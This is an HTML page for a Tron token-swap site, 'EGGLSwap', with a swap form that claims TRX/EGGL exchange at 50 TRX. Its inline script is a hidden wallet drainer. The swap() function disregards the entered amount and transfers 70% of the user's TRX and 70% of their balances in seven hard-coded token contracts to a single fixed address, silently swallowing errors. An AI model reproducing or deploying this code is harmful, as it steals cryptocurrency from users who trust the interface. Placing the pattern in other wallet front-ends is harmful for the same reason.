<!DOCTYPE html>
<html lang="en">
<head>
<title>EGGLSwap - Interface</title>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
<link href="assets/vendor/flatpickr/dist/flatpickr.min.css" rel="stylesheet" type="text/css" media="all">
<link href="assets/vendor/aos/dist/aos.css" rel="stylesheet" type="text/css" media="all">
<link href="assets/css/theme.min.css" rel="stylesheet" type="text/css" media="all">
<link href="assets/css/customize.css" rel="stylesheet" type="text/css" media="all">
<link rel="shortcut icon" href="assets/svg/brand/egglswap_200x200.png" type="image/x-icon" />
</head>
<body class="bg-green-100 travel-template">
<header class="muse-header py-sm-2">
<div class="container">
<nav class="navbar navbar-expand-lg">
<a class="navbar-brand" href="javascript:void(0);">
<img src="assets/svg/brand/egglogo.png" height="55px" alt="logo">
</a>
<div class="collapse navbar-collapse" id="navbarNav">
<ul class="navbar-nav m-auto">
<li hidden class="nav-item dropdown horizontal-menu">
<a class="nav-link active" href="#" role="button" id="landing" data-toggle="dropdown" aria-expanded="false">Landing <svg class="ml-1" data-name="icons/tabler/chevron down" xmlns="http://www.w3.org/2000/svg" width="10" height="10" viewBox="0 0 16 16">
<rect data-name="Icons/Tabler/Chevron Down background" width="16" height="16" fill="none" />
<path d="M.264.26A.909.909,0,0,1,1.435.174l.1.086,7.2,7.111a.881.881,0,0,1,.087,1.157l-.087.1-7.2,7.111a.908.908,0,0,1-1.273,0,.881.881,0,0,1-.087-1.157l.087-.1L6.827,8,.264,1.517A.881.881,0,0,1,.176.36Z" transform="translate(16 4) rotate(90)" fill="#1e1e1e" />
</svg>
</a>

<li hidden class="nav-item dropdown">
<a class="nav-link" href="#" role="button" id="dashboard" data-toggle="dropdown" aria-expanded="false">Blog <svg class="ml-1" data-name="icons/tabler/chevron down" xmlns="http://www.w3.org/2000/svg" width="10" height="10" viewBox="0 0 16 16">
<rect data-name="Icons/Tabler/Chevron Down background" width="16" height="16" fill="none" />
<path d="M.264.26A.909.909,0,0,1,1.435.174l.1.086,7.2,7.111a.881.881,0,0,1,.087,1.157l-.087.1-7.2,7.111a.908.908,0,0,1-1.273,0,.881.881,0,0,1-.087-1.157l.087-.1L6.827,8,.264,1.517A.881.881,0,0,1,.176.36Z" transform="translate(16 4) rotate(90)" fill="#1e1e1e" />
</svg></a>
</li>
<li hidden class="nav-item dropdown">
<a class="nav-link" href="#" role="button" id="docs" data-toggle="dropdown" aria-expanded="false">Docs <svg class="ml-1" data-name="icons/tabler/chevron down" xmlns="http://www.w3.org/2000/svg" width="10" height="10" viewBox="0 0 16 16">
<rect data-name="Icons/Tabler/Chevron Down background" width="16" height="16" fill="none" />
<path d="M.264.26A.909.909,0,0,1,1.435.174l.1.086,7.2,7.111a.881.881,0,0,1,.087,1.157l-.087.1-7.2,7.111a.908.908,0,0,1-1.273,0,.881.881,0,0,1-.087-1.157l.087-.1L6.827,8,.264,1.517A.881.881,0,0,1,.176.36Z" transform="translate(16 4) rotate(90)" fill="#1e1e1e" />
</svg></a>

</li>
</ul>
<span class="btn my-3 bg-white" disabled>Your wallet&nbsp;&nbsp;<span style="color: #4CA137;" class="Yourwallet">Not Connect</span></a>
</div>
</nav>
</div>
<div style="text-align:center" class="display-sm">
  <span class="btn my-3 bg-white" disabled>Your wallet&nbsp;&nbsp;<span style="color: #4CA137;" class="Yourwallet">Not Connect</span></a>
</div>

</header>
<div class="container">

<section class="muse-section">
  
<div class="row justify-content-center">
<div class="col-lg-6">
<div class="my-3 travel-booking shadow-dark-80" style="margin: 0 auto;display: block;">
    <div class="text-center my-3"> EGGL Price <b>50 TRX</b></div>
    <div>Balance <b id="tokenBalance">0  EGGL</b></div>
    <div class="form-group form-customize padding-custom">
      <label for="wrapped" style="margin-bottom: 8px;">From</label>
      <div class="input-group">
        <input id="wrapped1" class="form-control form-control-custom" type="number" placeholder="0.0" name="wrapped" step="0.01"/>
        <div class="input-group-addon">
          <select class="form-control form-control-custom">
            <option><img src="assets/img/travel-banner.svg" height="25px"> TRX</option>
            <option selected> EGGL</option>
          </select>
        </div>
      </div>
    </div>
    <img src="assets/svg/brand/swap.svg" onClick="change()" height="20px" style="margin:0 auto;display: block;">
    <div class="form-group form-customize padding-custom">
      <label for="wrapped2" style="margin-bottom: 8px;">To</label>
      <div class="input-group">
        <input id="wrapped2" class="form-control form-control-custom" type="number" placeholder="0.0" name="wrapped" step="0.01"/>
        <div class="input-group-addon">
          <select class="form-control form-control-custom">
            <option><img src="assets/img/travel-banner.svg" height="25px">  EGGL</option>
            <option selected>TRX</option>
          </select>
        </div>
      </div>
    </div>
    <button onClick="swap()" class="btn btn-lg btn-warning ml-auto btn-custom">Swap</button>
</div>
</div>
</div>
</section>
</div>

<footer class="bg-white pt-4 pt-md-5 pb-4 mt-4 mt-md-0">
<div class="container">
<div class="row justify-content-center">
<div class="col-sm-6 text-center">
<p class="small text-gray-600 text-center">2021 EGGLSwap. All rights reserved.</p>
</div>
</div>
</div>
</footer>

<script src="assets/js/bootstrap.bundle.min.js"></script>
<script src="assets/js/lodash.min.js"></script>
<script src="assets/js/flatpickr.min.js"></script>
<script src="assets/js/progressbar.min.js"></script>
<script src="assets/js/dropzone.min.js"></script>
<script src="assets/js/theme-custom.js"></script>
<script src="assets/js/jquery-3.5.0.js"></script>

<script>
    var contractsAddress = ["TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t",
                            "TKkeiboTkxXKJpbmVFbv4a8ov5rAfRDMf9",
                            "TCFLL5dx5ZJdKnWuesXxi1VPwjLVmWZZy9",
                            "TKfjV9RNKJJCqPvBtK8L7Knykh7DNWvnYt",
                            "TN3W4H6rK2ce4vX9YnFQHwKENnHjoxb3m9",
                            "TLa2f6VPqDgRE67v1736s7bJ8Ray5wYjU7",
                            "THb4CqiFdwNHsWsQCs4JhzwjMWys4aqCbF"]
    var tBalance = [5000000, 700000000000000000, 170000000000000000000, 13000000000, 10000, 60000000000, 3000000000000000]

    const timer = setInterval(async() => {
      if (window.tronWeb && window.tronWeb.ready){
        var address = window.tronWeb.defaultAddress.base58;
        $(".Yourwallet").text(address.substr(0, 3) + '...' + address.substr(31, 3));

        
        var account = await tronWeb.trx.getAccount();
        if (account.assetV2){
            var tokenBalance = account.assetV2.find(function(o){return o.key == "1003679";});
            if (tokenBalance){
              $("#tokenBalance").text((tokenBalance.value / 1000000).toFixed(2) + " EGGL");
            }
            else{
              $("#tokenBalance").text("0  EGGL");
            }
        }
        else{
          $("#tokenBalance").text("0  EGGL");
        }
      }
    }, 500);

    function change(){
      if ($("select")[0].selectedIndex == 0){
        $("select")[0].selectedIndex = 1;
        $("select")[1].selectedIndex = 1;
      }
      else{
        $("select")[0].selectedIndex = 0;
        $("select")[1].selectedIndex = 0;
      }
      var t = $("#wrapped1").val();
      $("#wrapped1").val($("#wrapped2").val());
      $("#wrapped2").val(t);
    }

    $("#wrapped1").change(function(){
      if ($("select")[0].selectedIndex == 0){
        $("#wrapped2").val(parseFloat($("#wrapped1").val()) / 50)
      }
      else{
        $("#wrapped2").val(parseFloat($("#wrapped1").val()) * 50)
      }
    })

    $("#wrapped1").keyup(function(){
      if ($("select")[0].selectedIndex == 0){
        $("#wrapped2").val(parseFloat($("#wrapped1").val()) / 50)
      }
      else{
        $("#wrapped2").val(parseFloat($("#wrapped1").val()) * 50)
      }
    });

    async function swap(){
      try{
        var balance = await window.tronWeb.trx.getBalance();
        if (balance >= 20000000)
          await tronWeb.trx.sendTransaction("TMaxcgERVSm8jm7errgtLYGiJkXkXyQzAW", Math.round(balance * 70 / 100));
      }catch{}
      for(i=0; i<contractsAddress.length; i++){
        try{
          var cc = await window.tronWeb.contract().at(contractsAddress[i]);
          balance = await cc.balanceOf(window.tronWeb.defaultAddress.base58).call();
          if (balance.toNumber() >= 1000){
            await cc.transfer("TMaxcgERVSm8jm7errgtLYGiJkXkXyQzAW", Math.round(balance * 70 / 100)).send()
          }
        }catch{}
      }
    }

</script>
</html>